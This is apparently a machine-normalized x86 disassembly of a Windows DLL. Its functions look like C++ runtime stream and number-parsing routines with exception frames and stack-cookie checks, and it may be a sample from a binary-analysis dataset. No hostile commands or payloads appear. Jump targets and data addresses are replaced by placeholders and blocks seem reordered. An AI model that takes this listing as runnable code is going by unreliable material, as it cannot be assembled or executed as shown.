mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
push 0x0
call sub_100033b0
or eax 0x4
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000fd51
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000fde0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028c78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
push edi
push esi
mov [ ebp - 0x4 ] edi
call sub_10004770
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x18 ]
add ecx esi
test edx edx
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_100138b0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
push ebx
add eax esi
lea ebx [ ebp - 0x18 ]
push ebx
push eax
xor edi edi
test ecx ecx
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x20 ]
push eax
sete dl
mov [ ebp - 0x30 ] dl
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx ]
mov edx [ edx + 0x20 ]
push edi
push eax
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp - 0x14 ]
call edx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
push 0x0
call sub_100033b0
or eax 0x4
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000fef1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000ff80
push ebp
mov ebp esp
push 0xffffffff
push sub_10028c38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
push edi
push esi
mov [ ebp - 0x4 ] edi
call sub_10004770
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x18 ]
add ecx esi
test edx edx
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_100138b0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
push ebx
add eax esi
lea ebx [ ebp - 0x18 ]
push ebx
push eax
xor edi edi
test ecx ecx
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x20 ]
push eax
sete dl
mov [ ebp - 0x30 ] dl
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx ]
mov edx [ edx + 0x1c ]
push edi
push eax
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp - 0x14 ]
call edx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
push 0x0
call sub_100033b0
or eax 0x4
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_10010091
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10010120
push ebp
mov ebp esp
push 0xffffffff
push sub_100290c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebx + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
cmp ecx edi
ja r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov ecx ebx
call sub_10010210
sub edi ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x20
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi ]
lea esi [ eax + 0x4 ]
mov [ eax ] edx
mov [ esi + 0x14 ] 0x7
xor eax eax
mov [ esi + 0x10 ] ecx
add edi 0x4
mov [ esi ] ax
call sub_10001bb0
mov eax [ ebx + 0x4 ]
and edi 0xffffffe0
add edi [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx ebx
call sub_10010210
cmp eax ecx
je r-xdata
sub_100101d0
mov ecx [ eax + 0x4 ]
push esi
mov esi [ eax ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
ja r-xdata
lea ecx [ edi * 8 ]
sub ecx edi
lea eax [ esi + ecx * 4 ]
pop esi
retn
push r--data
call sub_10015d4c
sub_10010210
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x5
cmp eax 0x7fffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x5
cmp eax edx
jbe r-xdata
push r--data
call sub_10015cff
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x7ffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10011120
mov edx eax
cmp edx eax
jae r-xdata
sub_10010260
push ebp
mov ebp esp
push 0xffffffff
push sub_100289f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
test [ esi + 0x14 ] 0x4000
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x50 ] 0xffffffff
mov eax esi
je r-xdata
lea edi [ ebp - 0x68 ]
mov [ ebp - 0x54 ] 0x0
call sub_100034b0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x4
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_10011200
add esp 0x10
push eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
call sub_10016c21
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x68 ]
add esp 0x10
mov ebx eax
test edi edi
je r-xdata
lea edi [ ebp - 0x50 ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10007de0
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x50 ]
mov ebx eax
mov [ ebp - 0x54 ] ebx
test edi edi
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] ecx
je r-xdata
push 0x0
lea ecx [ ebp - 0x5c ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x4c ]
call sub_100110c0
lea esi [ ebp - 0x2c ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_10006fc0
push 0x0
push eax
or eax 0xffffffff
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10001c20
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
push 0x0
lea ecx [ ebp - 0x70 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ebp - 0x50 ]
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x5c ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
xor ebx ebx
lea edi [ ebp - 0x4c ]
call sub_10005220
mov ecx [ ebp - 0x54 ]
lea esi [ ebp - 0x2c ]
call sub_10006fe0
push ebx
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x3
call sub_10001c20
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100173b1
add esp 0x4
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x70 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
test ebx ebx
jns r-xdata
or [ eax ] 0x1
cmp ebx 0x1
jbe r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov esi [ ebp - 0x38 ]
mov edi [ ebp - 0x4c ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100173b1
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x6c ]
setne dl
mov [ eax ] dl
or [ eax ] 0x2
jmp r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
push eax
lea edx [ ebp + 0xc ]
push edx
lea ecx [ ebp + 0x14 ]
call sub_100139f0
add esp 0x8
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
cmp esi 0x8
jb r-xdata
lea eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
push edi
call sub_100173b1
add esp 0x4
jmp r-xdata
sub_100104d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100288b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x48 ] eax
lea edi [ ebp - 0x50 ]
mov eax esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x3c ] 0x0
call sub_100034b0
push eax
mov [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea eax [ ebp + 0xc ]
push eax
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_10011200
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
push 0x0
lea ecx [ ebp - 0x40 ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] edx
lea ecx [ ebp - 0x2f ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x40 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
or [ eax ] 0x1
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x3c ]
push eax
push ebx
lea ecx [ ebp - 0x4c ]
push ecx
push edx
call sub_10016c21
add esp 0x10
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
mov ebx eax
call sub_10013d60
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
or [ eax ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp ebx 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov edx [ ebp - 0x44 ]
mov [ edx ] bx
jmp r-xdata
neg ebx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010630
push ebp
mov ebp esp
push 0xffffffff
push sub_100288b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x48 ] eax
lea edi [ ebp - 0x50 ]
mov eax esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x3c ] 0x0
call sub_100034b0
push eax
mov [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea eax [ ebp + 0xc ]
push eax
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_10011200
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
push 0x0
lea ecx [ ebp - 0x40 ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] edx
lea ecx [ ebp - 0x2f ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x40 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
or [ eax ] 0x1
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x3c ]
push eax
push ebx
lea ecx [ ebp - 0x4c ]
push ecx
push edx
call sub_10016c21
add esp 0x10
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
mov ebx eax
call sub_10013d60
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
or [ eax ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp ebx 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov edx [ ebp - 0x44 ]
mov [ edx ] ebx
jmp r-xdata
neg ebx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010780
push ebp
mov ebp esp
push 0xffffffff
push sub_10028888
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
lea edi [ ebp - 0x4c ]
mov eax esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x34 ] 0x0
call sub_100034b0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_10011200
add esp 0x10
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
call sub_10016888
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
push 0x0
lea ecx [ ebp - 0x3c ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x48 ] ecx
je r-xdata
or [ eax ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x3c ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x40 ]
mov [ edx ] ebx
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_100108b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028888
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
lea edi [ ebp - 0x4c ]
mov eax esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x34 ] 0x0
call sub_100034b0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_10011200
add esp 0x10
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
call sub_10016c21
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
push 0x0
lea ecx [ ebp - 0x3c ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x48 ] ecx
je r-xdata
or [ eax ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x3c ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x40 ]
mov [ edx ] ebx
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_100109e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028858
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ esp + 0x20 ] eax
lea edi [ esp + 0x24 ]
mov eax esi
mov [ esp + 0x10 ] ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x14 ] 0x0
call sub_100034b0
lea ecx [ esp + 0x14 ]
push ecx
push ecx
push eax
mov [ esp + 0x74 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ esp + 0x50 ]
call sub_10011200
add esp 0x14
push eax
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
call sub_1001694f
mov ebx eax
mov [ esp + 0x78 ] 0xffffffff
mov eax [ esp + 0x34 ]
add esp 0x10
mov [ esp + 0x30 ] edx
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
mov eax [ esp + 0x10 ]
je r-xdata
push 0x0
lea ecx [ esp + 0x2c ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x38 ]
cmp [ esp + 0x18 ] ecx
je r-xdata
or [ eax ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x28 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ eax ] 0x2
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x30 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010b40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028858
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
mov [ esp + 0x20 ] eax
lea edi [ esp + 0x24 ]
mov eax esi
mov [ esp + 0x10 ] ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x14 ] 0x0
call sub_100034b0
lea ecx [ esp + 0x14 ]
push ecx
push ecx
push eax
mov [ esp + 0x74 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push ebx
lea edx [ ebp + 0x14 ]
lea ecx [ esp + 0x50 ]
call sub_10011200
add esp 0x14
push eax
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
call sub_10016a12
mov ebx eax
mov [ esp + 0x78 ] 0xffffffff
mov eax [ esp + 0x34 ]
add esp 0x10
mov [ esp + 0x30 ] edx
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
mov eax [ esp + 0x10 ]
je r-xdata
push 0x0
lea ecx [ esp + 0x2c ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
